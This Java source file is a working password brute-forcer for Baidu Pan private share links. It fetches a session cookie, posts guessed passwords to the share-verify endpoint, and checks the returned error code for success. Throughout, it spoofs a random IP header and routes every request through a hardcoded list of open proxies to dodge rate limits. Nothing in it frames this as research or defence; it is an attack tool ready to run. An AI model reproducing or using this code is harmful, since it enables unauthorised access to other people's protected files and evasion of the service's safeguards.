package com.ljheee.pan.someone;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.URL;
import java.util.Random;
import java.util.concurrent.ThreadLocalRandom;

public class HttpURL {
    private String info = "";
    private String urlString = "";
    private String cookie = "";
    private String ip = "";
    URL url = null;

    Proxy proxys[] = {
            new Proxy(Proxy.Type.HTTP, new InetSocketAddress("124.207.82.166", 8008)),
            new Proxy(Proxy.Type.HTTP, new InetSocketAddress("112.91.218.21", 9000)),
            new Proxy(Proxy.Type.HTTP, new InetSocketAddress("202.204.121.126", 80)),
            new Proxy(Proxy.Type.HTTP, new InetSocketAddress("218.241.219.226", 9999)),
            new Proxy(Proxy.Type.HTTP, new InetSocketAddress("61.128.208.94", 3182)),
            new Proxy(Proxy.Type.HTTP, new InetSocketAddress("106.14.162.110", 8080)),
            new Proxy(Proxy.Type.HTTP, new InetSocketAddress("221.6.201.18", 9999)),
            new Proxy(Proxy.Type.HTTP, new InetSocketAddress("222.132.145.122", 53281)),
            new Proxy(Proxy.Type.HTTP, new InetSocketAddress("121.69.37.6", 9797))
    };

    public HttpURL() {
    }

    public HttpURL(String str) {
        urlString = str;
        // 定义info为网址init后的参数
        info = urlString.substring(urlString.indexOf('?') + 1);
    }

    /**
     * 执行操作
     *
     * @throws IOException
     */
    public boolean execute(String password) {
        try {
            ip = getIP();
            HttpGet();
            return tryPWD(password);
        } catch (IOException e) {
            e.printStackTrace();
            return false;
        }
    }

    /**
     * 尝试生成随机数
     */
    public String getIP() {
        Random r = new Random();
        r.nextInt(250);
        return r.nextInt(250) + "." + r.nextInt(250) + "." + r.nextInt(250)
                + "." + r.nextInt(250);
    }

    /**
     * 尝试密码
     *
     * @param pwd
     * @return
     * @throws UnsupportedEncodingException
     * @throws IOException
     */
    public boolean tryPWD(String pwd) throws UnsupportedEncodingException,
            IOException {
        String data = HttpPost("pwd=" + pwd + "&vcode=&vcode_str=");
        if (data.contains("\"errno\":-9"))
            return false;
        else if (data.contains("\"errno\":0"))
            return true;
        else
            return false;
    }

    /**
     * 进行GET请求获取新的cookie
     *
     * @return
     * @throws IOException
     */
    public void HttpGet() throws IOException {
        // 新建url连接
        url = new URL(urlString);
        // 打开链接
        HttpURLConnection connection = (HttpURLConnection) url.openConnection(proxys[ThreadLocalRandom.current().nextInt(proxys.length)]);
        // 设置参数
        connection.setRequestMethod("GET");
        connection.setRequestProperty("ContentType", "text/html;charset=UTF-8");
        connection.setRequestProperty("Host", "pan.baidu.com");
        connection.setRequestProperty("Ip", ip);
        connection.setRequestProperty("Referer",
                "http://pan.baidu.com/share/link?" + info);
        connection.setRequestProperty("Cookie", "");
        InputStream response = connection.getInputStream();
        cookie = connection.getHeaderField("Set-Cookie");
//        writeContent(response);
        connection.disconnect();
        response.close();
    }

    /**
     * 使用密码进行POST请求
     *
     * @param url
     * @param param
     * @return
     * @throws IOException
     * @throws UnsupportedEncodingException
     */
    public String HttpPost(String param) throws UnsupportedEncodingException,
            IOException {
        // 新建url连接
        url = new URL(
                "http://pan.baidu.com/share/verify?"
                        + info
                        + "&t="
                        + System.currentTimeMillis()
                        + "&bdstoken=null&channel=chunlei&clienttype=0&web=1&app_id=033646&logid=MTUwMTEyNDM2OTY5MzAuOTE5NTU5NjQwMTk0NDM0OA==");
        // 打开链接
        HttpURLConnection connection = (HttpURLConnection) url.openConnection(proxys[ThreadLocalRandom.current().nextInt(proxys.length)]);
        // 设置参数
        connection.setDoOutput(true); // Triggers POST.
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type",
                "application/x-www-form-urlencoded; charset=UTF-8");
        connection.setRequestProperty("Referer",
                "http://pan.baidu.com/share/init?" + info);
        connection.setRequestProperty("ContentLength",
                param.getBytes("UTF-8").length + "");
        connection.setRequestProperty("Host", "pan.baidu.com");
        connection.setRequestProperty("Ip", ip);
        connection.setRequestProperty("Cookie", cookie);
        OutputStream output = connection.getOutputStream();
        try {
            output.write(param.getBytes("UTF-8"));
        } finally {
            output.close();
        }
        InputStream response = connection.getInputStream();
        String html = writeContent(response);
        response.close();
        connection.disconnect();
        return html;
    }

    /**
     * 输出网页信息
     *
     * @param in
     * @throws IOException
     */
    public String writeContent(InputStream in) throws IOException {
        BufferedReader br = new BufferedReader(new InputStreamReader(in,
                "UTF-8"));
        String line;
        StringBuilder sb = new StringBuilder();
        while ((line = br.readLine()) != null) {// 循环读取流
            sb.append(line);
        }
        br.close();// 关闭流
        // System.out.println(sb.toString());
        return sb.toString();
    }
}